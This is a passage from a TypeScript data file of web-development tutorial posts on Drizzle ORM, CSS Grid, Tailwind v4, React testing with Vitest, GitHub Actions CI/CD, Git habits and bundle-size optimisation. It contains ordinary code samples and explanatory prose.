    slug: "drizzle-orm-complete-guide",
    title: "Drizzle ORM: The Complete Guide for TypeScript Developers",
    excerpt: "Drizzle ORM is the type-safe SQL toolkit taking over from Prisma. Learn schema definition, migrations, complex queries, relations, and performance patterns from scratch.",
    category: "tutorial",
    tags: ["drizzle", "postgresql", "database", "typescript", "orm"],
    readingTimeMinutes: 17,
    featured: false,
    difficulty: "intermediate",
    publishedAt: "2026-03-01T09:00:00Z",
    content: `
<h2 id="why-drizzle">Why Drizzle Over Prisma?</h2>
<p>Drizzle ORM has gained massive adoption for three reasons: SQL-first design (you write real SQL, not an abstraction), zero-overhead type inference, and a serverless-friendly connection model. Prisma's migration engine is heavy; Drizzle's is lightweight and works everywhere.</p>

<h2 id="setup">Installation and Setup</h2>
<pre><code class="language-bash">npm install drizzle-orm pg
npm install -D drizzle-kit @types/pg</code></pre>
<pre><code class="language-typescript">// drizzle.config.ts
import { defineConfig } from "drizzle-kit";

export default defineConfig({
  schema: "./src/schema.ts",
  out: "./migrations",
  dialect: "postgresql",
  dbCredentials: {
    url: process.env.DATABASE_URL!,
  },
});</code></pre>
<pre><code class="language-typescript">// src/db.ts
import { drizzle } from "drizzle-orm/node-postgres";
import { Pool } from "pg";
import * as schema from "./schema";

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
export const db = drizzle(pool, { schema });</code></pre>

<h2 id="schema">Defining Your Schema</h2>
<pre><code class="language-typescript">// src/schema.ts
import {
  pgTable, serial, text, varchar, integer, boolean,
  timestamp, pgEnum
} from "drizzle-orm/pg-core";
import { relations } from "drizzle-orm";

export const categoryEnum = pgEnum("category", ["blog", "tutorial", "how-to"]);

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  name: varchar("name", { length: 255 }).notNull(),
  email: varchar("email", { length: 255 }).notNull().unique(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

export const posts = pgTable("posts", {
  id: serial("id").primaryKey(),
  slug: varchar("slug", { length: 255 }).notNull().unique(),
  title: text("title").notNull(),
  content: text("content").notNull(),
  category: categoryEnum("category").notNull(),
  authorId: integer("author_id")
    .notNull()
    .references(() =&gt; users.id, { onDelete: "cascade" }),
  published: boolean("published").default(false).notNull(),
  publishedAt: timestamp("published_at"),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Declare relations for joins
export const postsRelations = relations(posts, ({ one }) =&gt; ({
  author: one(users, { fields: [posts.authorId], references: [users.id] }),
}));

export const usersRelations = relations(users, ({ many }) =&gt; ({
  posts: many(posts),
}));</code></pre>

<h2 id="migrations">Migrations</h2>
<pre><code class="language-bash"># Generate a migration
npx drizzle-kit generate

# Apply migrations
npx drizzle-kit migrate

# Push schema directly (development only — no migration files)
npx drizzle-kit push</code></pre>

<h2 id="queries">Querying</h2>
<pre><code class="language-typescript">import { eq, and, desc, like, sql } from "drizzle-orm";

// ─── SELECT ───────────────────────────────────────────────────────────────────

// Find all published posts
const publishedPosts = await db
  .select()
  .from(posts)
  .where(eq(posts.published, true))
  .orderBy(desc(posts.publishedAt))
  .limit(20);

// Find with relations (relational query)
const postWithAuthor = await db.query.posts.findFirst({
  where: eq(posts.slug, "my-post"),
  with: { author: true },
});

// Multiple conditions
const results = await db
  .select({ id: posts.id, title: posts.title })
  .from(posts)
  .where(
    and(
      eq(posts.category, "tutorial"),
      like(posts.title, "%TypeScript%"),
    )
  );

// ─── INSERT ───────────────────────────────────────────────────────────────────

const [newPost] = await db
  .insert(posts)
  .values({
    slug: "my-new-post",
    title: "My New Post",
    content: "Content here...",
    category: "blog",
    authorId: 1,
  })
  .returning();

// ─── UPDATE ───────────────────────────────────────────────────────────────────

const [updated] = await db
  .update(posts)
  .set({ published: true, publishedAt: new Date() })
  .where(eq(posts.id, postId))
  .returning();

// ─── DELETE ───────────────────────────────────────────────────────────────────

await db.delete(posts).where(eq(posts.id, postId));</code></pre>

<h2 id="aggregation">Aggregation and Raw SQL</h2>
<pre><code class="language-typescript">// Count by category
const categoryCounts = await db
  .select({
    category: posts.category,
    count: sql&lt;number&gt;\`cast(count(*) as int)\`,
  })
  .from(posts)
  .groupBy(posts.category);

// Raw SQL when ORM isn't enough
const result = await db.execute(
  sql\`SELECT * FROM posts WHERE to_tsvector(title) @@ plainto_tsquery(\${query})\`
);</code></pre>

<h2 id="transactions">Transactions</h2>
<pre><code class="language-typescript">// Atomic operations — all succeed or all fail
const result = await db.transaction(async (tx) =&gt; {
  const [user] = await tx
    .insert(users)
    .values({ name: "Alice", email: "alice@example.com" })
    .returning();

  const [post] = await tx
    .insert(posts)
    .values({ title: "Alice's post", authorId: user.id, ... })
    .returning();

  return { user, post };
});</code></pre>
    `,
  },

  // ─── CSS / STYLING ──────────────────────────────────────────────────────────

  {
    slug: "css-grid-complete-guide",
    title: "CSS Grid: The Complete Visual Guide (with Layouts You'll Actually Use)",
    excerpt: "CSS Grid solves layout problems that used to require JavaScript. This hands-on guide teaches you grid from the ground up — including the 5 layouts every developer needs.",
    category: "tutorial",
    tags: ["css", "grid", "layout", "web-development"],
    readingTimeMinutes: 14,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-03-05T09:00:00Z",
    content: `
<h2 id="grid-basics">CSS Grid Basics</h2>
<p>CSS Grid is a two-dimensional layout system — it handles rows <em>and</em> columns simultaneously. Activate it with <code>display: grid</code>:</p>
<pre><code class="language-css">.container {
  display: grid;
  grid-template-columns: 200px 1fr 1fr; /* 3 columns */
  grid-template-rows: auto 1fr auto;    /* 3 rows */
  gap: 1rem;
}</code></pre>
<p>The <code>fr</code> unit is grid-specific and stands for "fraction of remaining space". One <code>1fr</code> takes all remaining space; two <code>1fr 1fr</code> split it equally.</p>

<h2 id="repeat">repeat() and minmax()</h2>
<p>Create responsive grids without media queries:</p>
<pre><code class="language-css">/* 3 equal columns */
grid-template-columns: repeat(3, 1fr);

/* Auto-fill: as many columns as fit, each at least 250px */
grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));

/* Auto-fit: same, but collapses empty tracks */
grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));</code></pre>

<h2 id="placement">Placing Items</h2>
<pre><code class="language-css">/* Place by line numbers */
.hero {
  grid-column: 1 / 3;   /* span columns 1 to 3 */
  grid-row: 1 / 2;
}

/* Shorthand with span */
.sidebar {
  grid-column: span 2;  /* span 2 columns from current position */
}

/* Named areas — the most readable approach */
.layout {
  grid-template-areas:
    "header header header"
    "sidebar main main"
    "footer footer footer";
}

.header  { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main    { grid-area: main; }
.footer  { grid-area: footer; }</code></pre>

<h2 id="holy-grail">Layout 1: The Holy Grail</h2>
<p>Header, sidebar, main content, and footer — the classic layout:</p>
<pre><code class="language-css">.holy-grail {
  display: grid;
  grid-template-columns: 250px 1fr;
  grid-template-rows: auto 1fr auto;
  grid-template-areas:
    "header  header"
    "sidebar main"
    "footer  footer";
  min-height: 100vh;
}

@media (max-width: 768px) {
  .holy-grail {
    grid-template-columns: 1fr;
    grid-template-areas:
      "header"
      "main"
      "sidebar"
      "footer";
  }
}</code></pre>

<h2 id="card-grid">Layout 2: Responsive Card Grid</h2>
<pre><code class="language-css">.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 1.5rem;
}
/* No media queries needed — it's inherently responsive */</code></pre>

<h2 id="centered">Layout 3: Perfect Centering</h2>
<pre><code class="language-css">.centered {
  display: grid;
  place-items: center; /* shorthand for align-items + justify-items */
  min-height: 100vh;
}</code></pre>

<h2 id="masonry">Layout 4: Masonry-Style</h2>
<pre><code class="language-css">/* Native CSS masonry — Chrome flag, Firefox 77+, or JS fallback */
.masonry {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  grid-template-rows: masonry;
  gap: 1rem;
}</code></pre>

<h2 id="subgrid">Layout 5: Subgrid (Card Alignment)</h2>
<p>Subgrid lets child elements participate in the parent's grid — finally solving the card alignment problem:</p>
<pre><code class="language-css">.card-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 1.5rem;
}

.card {
  display: grid;
  grid-row: span 3;
  grid-template-rows: subgrid; /* inherit parent row tracks */
}

/* Now card title, content, and footer all align across cards */
.card-title   { grid-row: 1; }
.card-content { grid-row: 2; }
.card-footer  { grid-row: 3; }</code></pre>

<h2 id="alignment">Alignment Reference</h2>
<pre><code class="language-css">/* Align tracks in the container */
justify-content: start | end | center | stretch | space-between | space-around;
align-content: start | end | center | stretch | space-between | space-around;

/* Align items within their cells */
justify-items: start | end | center | stretch;
align-items: start | end | center | stretch;

/* Override for a single item */
justify-self: start | end | center | stretch;
align-self: start | end | center | stretch;</code></pre>
    `,
  },

  {
    slug: "tailwind-css-v4-guide",
    title: "Tailwind CSS v4: What Changed and How to Use the New Features",
    excerpt: "Tailwind v4 drops the config file, ships a Vite plugin, and gets 5x faster builds. Here's everything that changed and a practical guide to migrating your project.",
    category: "tutorial",
    tags: ["tailwind", "css", "web-development"],
    readingTimeMinutes: 12,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-03-10T09:00:00Z",
    content: `
<h2 id="whats-new">What Changed in Tailwind v4</h2>
<p>Tailwind CSS v4 is a ground-up rewrite. The biggest changes: no more <code>tailwind.config.js</code>, CSS-first configuration, a native Vite plugin, and CSS cascade layers. Builds are dramatically faster thanks to a new Rust-based engine (Oxide).</p>

<h2 id="installation">Installation</h2>
<pre><code class="language-bash"># With Vite
npm install tailwindcss @tailwindcss/vite

# vite.config.ts
import tailwindcss from "@tailwindcss/vite";

export default {
  plugins: [tailwindcss()],
};</code></pre>
<pre><code class="language-css">/* src/index.css */
@import "tailwindcss";</code></pre>
<p>That's it. No <code>tailwind.config.js</code>, no <code>postcss.config.js</code>, no <code>content</code> array to configure.</p>

<h2 id="css-first-config">CSS-First Configuration</h2>
<p>All customisation now lives in your CSS file using the <code>@theme</code> directive:</p>
<pre><code class="language-css">@import "tailwindcss";

@theme {
  --color-brand: oklch(65% 0.25 250);
  --color-brand-dark: oklch(50% 0.25 250);
  --font-display: "Cal Sans", sans-serif;
  --radius-card: 1.25rem;
  --shadow-card: 0 4px 24px rgb(0 0 0 / 0.08);
  --spacing-18: 4.5rem;
}

/* These are now available as utilities:
   text-brand, bg-brand, font-display,
   rounded-card, shadow-card, mt-18, etc. */</code></pre>

<h2 id="dark-mode">Dark Mode</h2>
<p>Dark mode now uses <code>@variant</code> and the media query by default:</p>
<pre><code class="language-css">/* Set variant — selector, media, or both */
@variant dark (&amp;:where(.dark *));</code></pre>
<pre><code class="language-html">&lt;div class="bg-white dark:bg-zinc-900 text-black dark:text-white"&gt;&lt;/div&gt;</code></pre>

<h2 id="arbitrary-values">Arbitrary Values and Properties</h2>
<pre><code class="language-html">&lt;!-- Arbitrary values (unchanged from v3) --&gt;
&lt;div class="top-[117px] grid-cols-[200px_1fr] bg-[#1DA1F2]"&gt;&lt;/div&gt;

&lt;!-- NEW: Arbitrary properties --&gt;
&lt;div class="[mask-type:luminance] [scrollbar-gutter:stable]"&gt;&lt;/div&gt;</code></pre>

<h2 id="new-utilities">Notable New Utilities in v4</h2>
<pre><code class="language-html">&lt;!-- field-sizing: textarea grows with content --&gt;
&lt;textarea class="field-sizing-content"&gt;&lt;/textarea&gt;

&lt;!-- Color-mix --&gt;
&lt;div class="bg-blue-500/75"&gt; &lt;!-- 75% opacity blue --&gt;

&lt;!-- starting-style for entry animations --&gt;
&lt;div class="transition-opacity starting:opacity-0 opacity-100"&gt;

&lt;!-- not variant --&gt;
&lt;button class="not-disabled:hover:bg-blue-600"&gt;

&lt;!-- inert --&gt;
&lt;div class="inert:opacity-50 inert:pointer-events-none"&gt;</code></pre>

<h2 id="migrating">Migrating from v3</h2>
<p>The official migration tool handles most changes automatically:</p>
<pre><code class="language-bash">npx @tailwindcss/upgrade@next</code></pre>
<p>Key manual changes to review:</p>
<ul>
  <li><code>ring</code> utilities changed — <code>ring</code> is now <code>ring-3</code></li>
  <li><code>shadow</code> is now <code>shadow-sm</code>; <code>shadow-md</code> is the old default</li>
  <li><code>opacity-{n}</code> on utilities gone — use <code>bg-black/50</code> syntax</li>
  <li><code>hover:underline</code> has no implicit transition — add <code>transition-colors</code> explicitly</li>
  <li>All variants now stack left-to-right: <code>hover:dark:text-white</code></li>
</ul>

<h2 id="components">Building Components with v4</h2>
<pre><code class="language-css">/* Use @layer components for reusable patterns */
@layer components {
  .btn {
    @apply inline-flex items-center gap-2 px-4 py-2 rounded-lg font-medium transition-colors;
  }
  .btn-primary {
    @apply btn bg-primary text-white hover:bg-primary/90;
  }
  .btn-ghost {
    @apply btn bg-transparent hover:bg-muted;
  }
}</code></pre>
    `,
  },

  // ─── TESTING ────────────────────────────────────────────────────────────────

  {
    slug: "testing-react-vitest",
    title: "Testing React Components with Vitest and Testing Library",
    excerpt: "A practical guide to testing React apps — unit tests, component tests, user interaction tests, and async testing with Vitest, React Testing Library, and MSW for API mocking.",
    category: "tutorial",
    tags: ["testing", "react", "vitest", "javascript"],
    readingTimeMinutes: 15,
    featured: false,
    difficulty: "intermediate",
    publishedAt: "2026-03-15T09:00:00Z",
    content: `
<h2 id="why-test">Why Test React Components</h2>
<p>Tests give you confidence to refactor. The key principle from Testing Library: test behaviour, not implementation. Your tests should resemble how your users interact with the app, not how your code is structured internally.</p>

<h2 id="setup">Setup</h2>
<pre><code class="language-bash">npm install -D vitest @testing-library/react @testing-library/user-event @testing-library/jest-dom jsdom</code></pre>
<pre><code class="language-typescript">// vitest.config.ts
import { defineConfig } from "vitest/config";
import react from "@vitejs/plugin-react";

export default defineConfig({
  plugins: [react()],
  test: {
    environment: "jsdom",
    globals: true,
    setupFiles: ["./src/test-setup.ts"],
  },
});</code></pre>
<pre><code class="language-typescript">// src/test-setup.ts
import "@testing-library/jest-dom";</code></pre>

<h2 id="first-test">Your First Component Test</h2>
<pre><code class="language-tsx">// src/components/Counter.tsx
export function Counter() {
  const [count, setCount] = useState(0);
  return (
    &lt;div&gt;
      &lt;p aria-label="count"&gt;Count: {count}&lt;/p&gt;
      &lt;button onClick={() =&gt; setCount(c =&gt; c + 1)}&gt;Increment&lt;/button&gt;
    &lt;/div&gt;
  );
}

// src/components/Counter.test.tsx
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Counter } from "./Counter";

describe("Counter", () =&gt; {
  it("starts at zero", () =&gt; {
    render(&lt;Counter /&gt;);
    expect(screen.getByLabelText("count")).toHaveTextContent("Count: 0");
  });

  it("increments when button clicked", async () =&gt; {
    const user = userEvent.setup();
    render(&lt;Counter /&gt;);
    await user.click(screen.getByRole("button", { name: /increment/i }));
    expect(screen.getByLabelText("count")).toHaveTextContent("Count: 1");
  });
});</code></pre>

<h2 id="queries">Choosing the Right Query</h2>
<p>Testing Library provides multiple ways to find elements. Use in this priority order:</p>
<pre><code class="language-typescript">// 1. By role (most accessible — preferred)
screen.getByRole("button", { name: /submit/i });
screen.getByRole("textbox", { name: /email/i });
screen.getByRole("heading", { name: /welcome/i });

// 2. By label text
screen.getByLabelText("Email address");

// 3. By placeholder (avoid if possible)
screen.getByPlaceholderText("Enter your email");

// 4. By text content
screen.getByText(/welcome to/i);

// 5. By test ID (last resort)
screen.getByTestId("submit-btn");</code></pre>

<h2 id="async">Async Testing</h2>
<pre><code class="language-tsx">// Component that fetches data
function PostList() {
  const [posts, setPosts] = useState([]);

  useEffect(() =&gt; {
    fetch("/api/posts").then(r =&gt; r.json()).then(setPosts);
  }, []);

  return &lt;ul&gt;{posts.map(p =&gt; &lt;li key={p.id}&gt;{p.title}&lt;/li&gt;)}&lt;/ul&gt;;
}

// Test with MSW (Mock Service Worker)
import { http, HttpResponse } from "msw";
import { setupServer } from "msw/node";

const server = setupServer(
  http.get("/api/posts", () =&gt;
    HttpResponse.json([
      { id: 1, title: "Astro Guide" },
      { id: 2, title: "React Hooks" },
    ])
  )
);

beforeAll(() =&gt; server.listen());
afterEach(() =&gt; server.resetHandlers());
afterAll(() =&gt; server.close());

it("renders posts from API", async () =&gt; {
  render(&lt;PostList /&gt;);
  expect(await screen.findByText("Astro Guide")).toBeInTheDocument();
  expect(screen.getByText("React Hooks")).toBeInTheDocument();
});</code></pre>

<h2 id="user-events">Simulating User Interactions</h2>
<pre><code class="language-tsx">it("submits the form with correct data", async () =&gt; {
  const onSubmit = vi.fn();
  const user = userEvent.setup();

  render(&lt;LoginForm onSubmit={onSubmit} /&gt;);

  await user.type(screen.getByLabelText(/email/i), "alice@example.com");
  await user.type(screen.getByLabelText(/password/i), "secret123");
  await user.click(screen.getByRole("button", { name: /log in/i }));

  expect(onSubmit).toHaveBeenCalledWith({
    email: "alice@example.com",
    password: "secret123",
  });
});</code></pre>

<h2 id="custom-hooks">Testing Custom Hooks</h2>
<pre><code class="language-typescript">import { renderHook, act } from "@testing-library/react";
import { useCounter } from "./useCounter";

it("increments the counter", () =&gt; {
  const { result } = renderHook(() =&gt; useCounter(0));

  act(() =&gt; {
    result.current.increment();
  });

  expect(result.current.count).toBe(1);
});</code></pre>

<h2 id="coverage">Code Coverage</h2>
<pre><code class="language-bash">npm install -D @vitest/coverage-v8</code></pre>
<pre><code class="language-bash">npx vitest run --coverage</code></pre>
<p>Aim for 80%+ branch coverage on business logic, but don't chase 100% — it creates tests that verify implementation instead of behaviour.</p>
    `,
  },

  // ─── DEVOPS / DEPLOYMENT ────────────────────────────────────────────────────

  {
    slug: "github-actions-frontend-cicd",
    title: "GitHub Actions: CI/CD for Frontend Projects in 2026",
    excerpt: "Set up automated testing, linting, building, and deployment for your frontend with GitHub Actions. Covers caching, matrix builds, environment secrets, and deployment to Vercel/Netlify.",
    category: "tutorial",
    tags: ["github-actions", "ci-cd", "devops", "automation"],
    readingTimeMinutes: 16,
    featured: false,
    difficulty: "intermediate",
    publishedAt: "2026-03-20T09:00:00Z",
    content: `
<h2 id="github-actions-basics">GitHub Actions Basics</h2>
<p>GitHub Actions is an automation platform built into GitHub. Workflows are YAML files in <code>.github/workflows/</code>. Every workflow has:</p>
<ul>
  <li><strong>Triggers</strong> (<code>on</code>) — when to run</li>
  <li><strong>Jobs</strong> — parallel or sequential work units</li>
  <li><strong>Steps</strong> — individual commands within a job</li>
</ul>

<h2 id="basic-ci">Basic CI: Lint, Type Check, Test</h2>
<pre><code class="language-yaml"># .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  quality:
    name: Lint, Type Check, Test
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - uses: pnpm/action-setup@v4
        with:
          version: 10

      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: pnpm

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

      - name: Lint
        run: pnpm lint

      - name: Type check
        run: pnpm typecheck

      - name: Test
        run: pnpm test --coverage

      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          token: \${{ secrets.CODECOV_TOKEN }}</code></pre>

<h2 id="caching">Dependency Caching</h2>
<p>Caching is handled automatically by <code>setup-node</code> with <code>cache: pnpm</code>, but you can add more granular caching:</p>
<pre><code class="language-yaml">- name: Cache build output
  uses: actions/cache@v4
  with:
    path: .next
    key: \${{ runner.os }}-next-\${{ hashFiles('pnpm-lock.yaml') }}-\${{ hashFiles('src/**') }}
    restore-keys: |
      \${{ runner.os }}-next-\${{ hashFiles('pnpm-lock.yaml') }}-
      \${{ runner.os }}-next-</code></pre>

<h2 id="secrets">Environment Secrets</h2>
<p>Store secrets in GitHub: Settings → Secrets and variables → Actions.</p>
<pre><code class="language-yaml">- name: Build
  env:
    NEXT_PUBLIC_API_URL: \${{ secrets.PROD_API_URL }}
    DATABASE_URL: \${{ secrets.DATABASE_URL }}
  run: pnpm build</code></pre>

<h2 id="matrix">Matrix Builds — Test Multiple Environments</h2>
<pre><code class="language-yaml">jobs:
  test:
    strategy:
      matrix:
        node: [18, 20, 22]
        os: [ubuntu-latest, macos-latest]

    runs-on: \${{ matrix.os }}

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: \${{ matrix.node }}
      - run: npm ci && npm test</code></pre>

<h2 id="deploy-vercel">Deploy to Vercel</h2>
<pre><code class="language-yaml"># .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    needs: [quality] # only deploy if CI passes

    steps:
      - uses: actions/checkout@v4

      - name: Deploy to Vercel
        uses: amondnet/vercel-action@v25
        with:
          vercel-token: \${{ secrets.VERCEL_TOKEN }}
          vercel-org-id: \${{ secrets.VERCEL_ORG_ID }}
          vercel-project-id: \${{ secrets.VERCEL_PROJECT_ID }}
          vercel-args: --prod</code></pre>

<h2 id="reusable">Reusable Workflows</h2>
<p>Extract common patterns into reusable workflows to avoid duplication across repos:</p>
<pre><code class="language-yaml"># .github/workflows/reusable-test.yml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: "20"

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: \${{ inputs.node-version }}
      - run: npm ci && npm test

# Use it from another workflow:
# jobs:
#   test:
#     uses: ./.github/workflows/reusable-test.yml
#     with:
#       node-version: "22"</code></pre>

<h2 id="release">Automated Releases with semantic-release</h2>
<pre><code class="language-bash">npm install -D semantic-release @semantic-release/changelog @semantic-release/git</code></pre>
<pre><code class="language-yaml">- name: Release
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
    NPM_TOKEN: \${{ secrets.NPM_TOKEN }}
  run: npx semantic-release</code></pre>
    `,
  },

  // ─── GIT ────────────────────────────────────────────────────────────────────

  {
    slug: "git-best-practices-2026",
    title: "Git Best Practices: Branching, Commits, and History That Makes Sense",
    excerpt: "The git habits that separate senior from junior developers — writing meaningful commits, structuring branches, squashing effectively, handling conflicts, and keeping history clean.",
    category: "blog",
    tags: ["git", "version-control", "workflow", "best-practices"],
    readingTimeMinutes: 11,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-03-25T09:00:00Z",
    content: `
<h2 id="commit-messages">Writing Great Commit Messages</h2>
<p>A good commit message completes the sentence: <em>"If applied, this commit will..."</em>. Follow the Conventional Commits specification:</p>
<pre><code class="language-text">type(scope): short description (max 72 chars)

Optional longer body explaining the WHY, not the what.
The code itself shows what changed — the message explains why.

Closes #123</code></pre>
<p>Common types: <code>feat</code>, <code>fix</code>, <code>docs</code>, <code>style</code>, <code>refactor</code>, <code>test</code>, <code>chore</code>.</p>
<pre><code class="language-text">✅ feat(auth): add JWT refresh token rotation
✅ fix(posts): handle null publishedAt in RSS feed
✅ refactor(db): extract query helpers into separate module

❌ fixed stuff
❌ WIP
❌ update</code></pre>

<h2 id="branching">Branching Strategy</h2>
<p><strong>For small teams (recommended):</strong> Trunk-Based Development — work in short-lived feature branches (1–2 days max), merge directly to <code>main</code>, use feature flags for incomplete work.</p>
<p><strong>For larger teams:</strong> Git Flow — <code>main</code> is always production-ready, <code>develop</code> is the integration branch, <code>feature/*</code> for features, <code>hotfix/*</code> for emergency fixes.</p>
<pre><code class="language-bash"># Trunk-based: short-lived branches
git checkout -b feat/newsletter-double-optin
# ... work for a day ...
git push origin feat/newsletter-double-optin
# Open PR, review, merge to main</code></pre>

<h2 id="atomic-commits">Atomic Commits</h2>
<p>Each commit should do exactly one thing. This makes bisecting bugs easy and makes reviewing PRs clearer:</p>
<pre><code class="language-bash"># Stage specific hunks within a file, not the whole file
git add -p src/components/Header.tsx

# Review what you're committing
git diff --staged

# Commit only that logical change
git commit -m "feat(header): add dark mode toggle"</code></pre>

<h2 id="rewriting-history">Rewriting History (Safely)</h2>
<pre><code class="language-bash"># Amend the last commit (before pushing)
git commit --amend -m "corrected commit message"

# Interactive rebase — squash, reorder, edit the last 4 commits
git rebase -i HEAD~4
# In the editor: pick, squash, fixup, reword, drop

# Squash a feature branch before merging
git merge --squash feat/my-feature
git commit -m "feat(posts): add tag filtering"</code></pre>
<p><strong>Golden rule:</strong> never rewrite history that has been pushed to a shared branch.</p>

<h2 id="stash">git stash — Save Work Without Committing</h2>
<pre><code class="language-bash"># Save current work
git stash push -m "WIP: newsletter form validation"

# List stashes
git stash list

# Apply the most recent stash (keeps it in the list)
git stash apply

# Apply and remove
git stash pop

# Apply a specific stash
git stash apply stash@{2}</code></pre>

<h2 id="bisect">Finding Bugs with git bisect</h2>
<pre><code class="language-bash"># Start bisect
git bisect start

# Mark current commit as bad
git bisect bad

# Mark a known good commit
git bisect good v1.2.0

# Git will checkout the middle commit
# Test it, then tell git the result:
git bisect bad   # or: git bisect good

# Repeat until git identifies the culprit
# Then reset:
git bisect reset</code></pre>

<h2 id="hooks">Git Hooks with Husky</h2>
<pre><code class="language-bash">npm install -D husky lint-staged
npx husky init</code></pre>
<pre><code class="language-bash"># .husky/pre-commit
npx lint-staged</code></pre>
<pre><code class="language-json">// package.json
{
  "lint-staged": {
    "*.{ts,tsx}": ["eslint --fix", "prettier --write"],
    "*.{css,json,md}": "prettier --write"
  }
}</code></pre>

<h2 id="aliases">Useful Git Aliases</h2>
<pre><code class="language-bash">git config --global alias.lg "log --oneline --graph --decorate --all"
git config --global alias.st "status -sb"
git config --global alias.undo "reset HEAD~1 --mixed"
git config --global alias.aliases "config --get-regexp alias"</code></pre>
    `,
  },

  // ─── PERFORMANCE ────────────────────────────────────────────────────────────

  {
    slug: "javascript-bundle-optimization",
    title: "How to Reduce Your JavaScript Bundle Size by 60%",
    excerpt: "Practical techniques to analyse and shrink your JS bundle — tree shaking, code splitting, lazy loading, removing dead code, and replacing heavy dependencies with lighter alternatives.",
    category: "how-to",
    tags: ["performance", "javascript", "webpack", "vite", "optimization"],
    readingTimeMinutes: 13,
    featured: false,
    difficulty: "intermediate",
    publishedAt: "2026-04-01T09:00:00Z",
    content: `
<h2 id="analyse">Step 1: Analyse Your Bundle First</h2>
<p>Don't guess — measure. Use a bundle analyser to see exactly what's large:</p>
<pre><code class="language-bash"># Vite
npm install -D rollup-plugin-visualizer

# vite.config.ts
import { visualizer } from "rollup-plugin-visualizer";
export default {
  plugins: [visualizer({ open: true, gzipSize: true })],
};</code></pre>
<pre><code class="language-bash"># webpack
npm install --save-dev webpack-bundle-analyzer
npx webpack --json stats.json
npx webpack-bundle-analyzer stats.json</code></pre>
<p>Run your build and look for: large third-party libraries, duplicated code, unnecessary polyfills, and modules you're not using.</p>

<h2 id="tree-shaking">Tree Shaking — Removing Dead Code</h2>
<p>Tree shaking only works with ES modules (import/export). Make sure you're importing named exports, not the whole library:</p>
<pre><code class="language-javascript">// ❌ Imports the entire library (~70kb)
import _ from "lodash";
const sorted = _.sortBy(array, "name");

// ✅ Imports only sortBy (~2kb)
import sortBy from "lodash/sortBy";

// ✅ Even better — use native Array methods
const sorted = [...array].sort((a, b) =&gt; a.name.localeCompare(b.name));</code></pre>

<h2 id="code-splitting">Code Splitting with Dynamic Imports</h2>
<p>Split your bundle at route boundaries so users only download what they need:</p>
<pre><code class="language-typescript">// React with lazy loading
import { lazy, Suspense } from "react";

const AdminPanel = lazy(() =&gt; import("./pages/AdminPanel"));
const PostEditor = lazy(() =&gt; import("./pages/PostEditor"));

function App() {
  return (
    &lt;Suspense fallback={&lt;div&gt;Loading...&lt;/div&gt;}&gt;
      &lt;Route path="/admin" component={AdminPanel} /&gt;
    &lt;/Suspense&gt;
  );
}</code></pre>
<pre><code class="language-typescript">// Load on demand — e.g., heavy chart library only when needed
const Chart = lazy(() =&gt;
  import("chart.js").then(m =&gt; ({ default: m.Chart }))
);</code></pre>

<h2 id="heavy-deps">Replace Heavy Dependencies</h2>
<table>
  <tr><th>Instead of</th><th>Use</th><th>Savings</th></tr>
  <tr><td>moment.js (67kb)</td><td>date-fns (2-8kb) or Temporal API</td><td>~60kb</td></tr>
  <tr><td>lodash (71kb)</td><td>lodash-es + tree shaking, or native</td><td>~65kb</td></tr>
  <tr><td>axios (13kb)</td><td>fetch (built-in)</td><td>13kb</td></tr>
  <tr><td>classnames (3kb)</td><td>clsx (0.3kb)</td><td>2.7kb</td></tr>
  <tr><td>uuid (22kb)</td><td>crypto.randomUUID() (built-in)</td><td>22kb</td></tr>
</table>

<h2 id="images">Images Are Often the Real Problem</h2>
<p>Images frequently outweigh JS by 10x. Address them first:</p>
<pre><code class="language-html">&lt;!-- Use modern formats --&gt;
&lt;picture&gt;
  &lt;source srcset="hero.avif" type="image/avif" /&gt;
  &lt;source srcset="hero.webp" type="image/webp" /&gt;
  &lt;img src="hero.jpg" alt="Hero" loading="lazy" decoding="async" /&gt;
&lt;/picture&gt;</code></pre>
<pre><code class="language-bash"># Convert to AVIF/WebP
npx sharp-cli --input "*.jpg" --output dist/ --format avif</code></pre>

<h2 id="vite-config">Vite Optimization Config</h2>
<pre><code class="language-typescript">// vite.config.ts
export default defineConfig({
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          // Separate large stable deps into their own chunk
          vendor: ["react", "react-dom"],
          query: ["@tanstack/react-query"],
        },
      },
    },
    // Target modern browsers — smaller output
    target: "es2022",
    // Minify CSS
    cssMinify: "lightningcss",
  },
});</code></pre>

<h2 id="font-loading">Font Loading Optimisation</h2>
<pre><code class="language-html">&lt;!-- Preconnect to font CDN --&gt;
&lt;link rel="preconnect" href="https://fonts.googleapis.com" /&gt;
&lt;link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /&gt;

&lt;!-- Subset the font — only load characters you use --&gt;
&lt;link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap" rel="stylesheet" /&gt;</code></pre>
<pre><code class="language-css">/* Self-host with font-face — avoids CDN round-trip */
@font-face {
  font-family: "Inter";
